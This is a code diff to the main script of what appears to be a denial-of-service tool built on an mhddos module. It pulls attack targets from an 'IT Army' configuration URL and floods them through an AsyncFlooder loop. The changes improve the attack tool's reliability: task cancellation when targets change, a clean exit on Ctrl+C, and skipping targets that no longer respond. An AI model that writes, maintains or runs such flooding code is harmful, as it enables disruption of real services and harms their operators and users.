@@ -14,8 +14,7 @@ from typing import Any, Generator, Iterator, List, Optional
 from src.cli import init_argparse
 from src.concurrency import DaemonThreadPool
 from src.core import (
-    logger, cl, LOW_RPC, IT_ARMY_CONFIG_URL, WORK_STEALING_DISABLED,
-    DNS_WORKERS, Params, Stats, PADDING_THREADS
+    logger, cl, LOW_RPC, IT_ARMY_CONFIG_URL, WORK_STEALING_DISABLED, Params, Stats
 )
 from src.dns_utils import resolve_all_targets
 from src.mhddos import main as mhddos_main, async_main as mhddos_async_main
@@ -25,29 +24,33 @@ from src.system import fix_ulimits, is_latest_version
 from src.targets import TargetsLoader
 
 
-# XXX: need a way stop on the signal
 # XXX: we need to stick to working targets here the same way we did
 #      for wokring stealing algo. otherwise we might be spending too
 #      much time cycling over non-working targets. as we all operation
 #      one the same thread and we don't really need any sort of sync,
 #      we can also do something like prioority queue to reduce priority
-#     for dead targets
+#      for dead targets
 class AsyncFlooder:
 
     def __init__(self, switch_after: int = 100):
         self._switch_after = switch_after
         self._runnables = None
+        self._current_task = None
 
     def update_targets(self, runnables: Iterator[Any]):
         self._runnables = runnables
-
+        if self._current_task is not None:
+            self._current_task.cancel()
+   
+    # XXX: setup current task properly
     async def loop(self):
         assert self._runnables is not None
         while True:
             runnable = next(self._runnables)
             try:
                 for _ in range(self._switch_after):
-                    await runnable.run()
+                    if not (await runnable.run()):
+                        break
             except asyncio.CancelledError:
                 return
             except Exception:
@@ -210,7 +213,7 @@ async def run_async_ddos(
     await asyncio.gather(*tasks)
 
 
-async def start(args):
+async def start(args, shutdown_event: Event):
     print_banner(args.vpn_mode)
     fix_ulimits()
 
@@ -263,11 +266,19 @@ async def start(args):
         0, # XXX: get back to this functionality later args.udp_threads,
         args.switch_after,
     )
+    shutdown_event.set()
 
 
 # XXX: try uvloop when available
 if __name__ == '__main__':
+    args = init_argparse().parse_args()
+    shutdown_event = Event()
     try:
-        asyncio.run(start(init_argparse().parse_args()))
+        # run event loop in a separate thread to ensure the application
+        # exists immediately after Ctrl+C
+        Thread(target=lambda: asyncio.run(start(args, shutdown_event)), daemon=True).start()
+        # we can do something smarter rather than waiting forever,
+        # but as of now it's gonna be consistent with previous version
+        shutdown_event.wait()
     except KeyboardInterrupt:
         logger.info(f'{cl.BLUE}Завершуємо роботу...{cl.RESET}')
